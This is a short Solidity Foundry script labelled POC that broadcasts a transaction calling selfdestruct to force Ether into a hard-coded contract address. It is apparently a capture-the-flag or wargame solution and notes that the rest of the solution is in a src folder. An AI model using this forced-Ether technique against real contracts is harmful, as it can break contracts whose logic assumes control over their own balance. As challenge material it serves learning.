// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";

contract POC is Script {

    function run() external payable{
        vm.startBroadcast();
        selfdestruct(0x351a6b30D82Bd32E696dFF3C2f193F8a251bB598);
        vm.stopBroadcast();
    }
}

//check src folder for solution